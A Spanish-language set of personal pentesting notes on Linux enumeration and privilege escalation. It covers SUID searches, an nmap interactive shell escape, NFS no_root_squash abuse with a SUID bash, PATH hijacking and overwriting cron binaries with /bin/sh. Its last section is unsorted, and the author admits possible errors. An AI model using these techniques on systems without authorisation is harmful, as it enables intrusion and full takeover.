# Enumeración del sistema

## Enumeración básica

Hacer una enumeración manual buscando en escritorios y carpetas suele ser interesante para encontrar cierta información, uno de los lugares donde podríamos encontrar información interesante es en

```
cd /var/www
```

## Permisos

Con el comando:

```
id
```

Podemos saber si estamos en algún grupo concreto o en qué grupos está el usuario actual, de esta manera podemos buscar aquellos archivos/ejecutables a los que tiene acceso dicho grupo:

```
find / -type f -group grupoabuscar 2>/dev/null
```

Si encontramos algún ejecutable que tenga permisos de ejecución y se ejecute como root podemos utilizarlo para escalar privilegios. "[Cambiar binarios](cambio-de-binarios.md)"

Podemos también utilizar el comando:

```
sudo -l
```

Si tenemos la contraseña del usuario, de esta manera nos listará los permisos de los que dispone el usuario para ejecutar cómo sudo.

## Netstat

Podemos obtener información sobre distintos puertos que estén a la escucha, en ocasiones podemos encontrar puertos que no se veían desde fuera o que están en escucha en otras redes y nos pueden permitir algún otro acceso.

```
netstat -ano
```

## Versión del SO

Puede permitirnos encontrar algunas vulnerabilidades en función de la versión.

```
cat /proc/version
```

## SUIDs

Podemos buscar aquellos archivos que tienen SUID cómo el usuario root ya que si son vulnerables podemos aprovecharlos para escalar privilegios.

```
find / \( -perm -4000 -o -perm -2000 \) -type f -print 2>/dev/null
```

### Nmap

Podemos aprovecharnos de un SUID en nmap

```
nmap --interactive

#dentro de la consola interactiva de nmap lanzamos lo siguiente.
!sh
```

## /etc/exports

Si existe el argumento "no\_root\_squash" quiere decir que puedes acceder cómo root si montas dicho directorio en tu máquina atacante, esto te permite crear un binario SUID con una bash y poder escalar privilegios en la máquina.

![](<../../../.gitbook/assets/image (35).png>)

```
sudo mount -t nfs <IP>:<recursocompartido> <directoriolocal>/ -o nolock
cd <directoriolocal>
cp <binariodebash> .; chmod +s bash

#Desde nuestra reverse shell o nuestra conexión a la otra máquina lo ejecutamos.
```

## Utilidades

{% embed url="https://github.com/mzet-/linux-exploit-suggester" %}

## TENGO QUE ORDENAR LO SIGUIENTE (SORRY)

Lo primero que se debe hacer siempre es investigar archivos que pueda haber en el equipo:

\-	Escritorios de los Usuarios

\-	/var/html

o	Bases de datos

o	Conexiones realizadas en texto claro a distintos servicios

o	PHP, FTP…

\-	Puedes mirar en distintas carpetas por si acaso, y si te quedas atascado ya terminas de mirar todo el equipo.



En segundo lugar ¿Tenemos acceso al PATH?

&#x9;echo $PATH

&#x9;PATH=/tmp:$PATH

Es importante esto ya que si tenemos acceso al PATH quizás podamos descubrir alguna manera de escalar privilegios a través de un binario.



Podemos comprobar las tareas que se ejecutan automáticamente

&#x9;crontab -l

ls -al /etc/cron\* /etc/at\*

cat /etc/cron\* /etc/at\* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"



Si alguna se ejecuta con permisos de root o de un usuario con mayores privilegios que los que tenemos podemos modificar el binario al que hace referencia metiéndolo en la carpeta tmp o donde tengamos permisos de escritura

&#x9;echo '/bin/sh' > “nombredelbinario”



También podemos ver si algún proceso está ejecutándose con altos privilegios e intentar acceder a él de esta misma forma.

&#x9;ps aux

ps -ef

top -n 1



> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
